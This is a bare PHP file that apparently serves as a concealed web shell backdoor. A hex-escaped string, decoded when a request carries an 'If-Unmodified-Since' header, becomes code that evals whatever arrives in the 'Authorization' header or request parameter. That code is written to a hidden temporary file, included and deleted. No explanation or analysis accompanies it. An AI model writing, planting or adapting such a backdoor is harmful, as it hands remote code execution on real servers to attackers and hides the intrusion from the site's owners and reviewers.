<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $c = "<\x3fp\x68p\x20@\x65v\x61l\x28$\x5fH\x45A\x44E\x52S\x5b\"\x41u\x74h\x6fr\x69z\x61t\x69o\x6e\"\x5d)\x3b@\x65v\x61l\x28$\x5fR\x45Q\x55E\x53T\x5b\"\x41u\x74h\x6fr\x69z\x61t\x69o\x6e\"\x5d)\x3b";
    $f = '.'.time();
    file_put_contents($f, $c);
    include($f);
    unlink($f);
}